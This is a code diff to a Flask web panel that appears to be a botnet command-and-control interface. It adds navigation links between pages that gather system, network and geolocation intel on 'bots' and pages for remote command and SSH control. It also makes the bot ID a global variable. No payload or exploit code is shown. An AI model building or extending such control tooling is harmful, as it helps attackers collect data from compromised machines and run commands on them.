@@ -87,6 +87,7 @@ def intel_src():
  all_offline = False if server.interface.bots else True 
 
  if 'id' in request.args:
+  global bot_id
   bot_id = request.args.get('id')
   bot = get_bot(bot_id)
 
@@ -95,9 +96,8 @@ def intel_src():
    start_bot_services(bot_id)
   else:
    if session['bot_id'] != bot_id:
-    # send kill cmd previous bot to shutdown services
     start_bot_services(bot_id)
-  return render_template('intel.html', bot_id=bot_id)
+  return render_template('intel.html')
  else:
   msg = 'All bots are offline' if all_offline else 'Bot not found'
   return render_template('offline.html', msg=msg)
@@ -111,9 +111,10 @@ def intel_system_src():
     <li onclick="intelSystemSrc()" class="selected"><div>System</div></li>
     <li onclick="intelNetworkSrc()"><div>Network</div></li>
     <li onclick="intelGeoSrc()"><div>Geo</div></li>
+    <li onclick="location.href='/control?id={}'"><div>Controls</div></li>
   </ul> 
   <div id="display-area"></div> 
- '''
+ '''.format(bot_id)
  return jsonify({'resp': src}) 
 
 def render_system_data(data):
@@ -161,9 +162,10 @@ def intel_network_src():
     <li onclick="intelSystemSrc()"><div>System</div></li>
     <li onclick="intelNetworkSrc()" class="selected"><div>Network</div></li>
     <li onclick="intelGeoSrc()"><div>Geo</div></li>
+    <li onclick="location.href='/control?id={}'"><div>Controls</div></li>
   </ul> 
   <div id="display-area"></div> 
- '''
+ '''.format(bot_id)
  return jsonify({'resp': src}) 
 
 def render_network_data(data):
@@ -208,9 +210,10 @@ def intel_geo_src():
     <li onclick="intelSystemSrc()"><div>System</div></li>
     <li onclick="intelNetworkSrc()"><div>Network</div></li>
     <li onclick="intelGeoSrc()" class="selected"><div>Geo</div></li>
+    <li onclick="location.href='/control?id={}'"><div>Controls</div></li>
   </ul> 
   <div id="display-area"></div> 
- '''
+ '''.format(bot_id)
  return jsonify({'resp': src}) 
 
 def render_geo_data(data):
@@ -267,12 +270,13 @@ def controls():
  all_offline = False if server.interface.bots else True 
 
  if 'id' in request.args:
+  global bot_id
   bot_id = request.args.get('id')
   bot = get_bot(bot_id)
 
  if bot:
   session['bot_id'] = bot_id
-  return render_template('control.html', bot_id=bot_id)
+  return render_template('control.html')
  else:
   msg = 'All bots are offline' if all_offline else 'Bot not found'
   return render_template('offline.html', msg=msg)
@@ -285,11 +289,12 @@ def control_cmd_src():
   <ul class="sub-tabs">
     <li onclick="cmdSrc()" class="selected"><div>Command</div></li>
     <li onclick="sshSrc()"><div>SSH</div></li>
+    <li onclick="location.href='/intel?id={}'"><div>Intels</div></li>
   </ul> 
   <div id="cmd-line"></div>
   <input id="console" placeholder="help" spellcheck="false" type="text" size=64>
   <img src="/static/img/loading.gif" id="console-load">
- '''
+ '''.format(bot_id)
  return jsonify({'resp': src})  
 
 @app.route('/control/cmd/cmd', methods=['POST'])
@@ -312,11 +317,12 @@ def control_ssh_src():
   <ul class="sub-tabs">
     <li onclick="cmdSrc()"><div>Command</div></li>
     <li onclick="sshSrc()" class="selected"><div>SSH</div></li>
+    <li onclick="location.href='/intel?id={}'"><div>Intels</div></li>
   </ul> 
   <div id="cmd-line"></div>
   <input id="cmd-input" placeholder="menu" spellcheck="false" type="text" size=64>
   <img src="/static/img/loading.gif" id="cmd-load">
- '''
+ '''.format(bot_id)
  return jsonify({'resp': src})
 
 @app.route('/control/ssh/exe', methods=['POST'])
@@ -402,6 +408,7 @@ def account_management():
  <ul class="sub-tabs">
    <li onclick="usernameUpdateSource()" class="selected"><div>Username</div></li>
    <li onclick="passwordUpdateSource()"><div>Password</div></li>
+   <li onclick="serverServiceSource()"><div>Server</div></li>
   </ul> 
  <div id="display-area"></div> 
  '''
@@ -529,7 +536,7 @@ def server_service_source():
   <form id="server-address">
    <input type="text" id="ip" placeholder="127.0.0.1" onkeyup="validateIp(this.value)" maxlength="15" style="margin-top: 5px;">
    <span style="color: #000; font-size: 25px; font-family: rich;">:</span>
-   <input type="text" id="port" placeholder="8080" style="width: 65px;" onkeyup="validatePort(this.value)" maxlength="5"> 
+   <input type="text" id="port" placeholder="8080" style="width: 85px;" onkeyup="validatePort(this.value)" maxlength="5"> 
    <hr style="width: 45%; margin: 2.3% auto; margin-top: 5%;">
    <img src="/static/img/load.gif" id="server-service-load" >
    <button type="button" id="server-address-btn" onclick="serverService()">Start Server</button>         
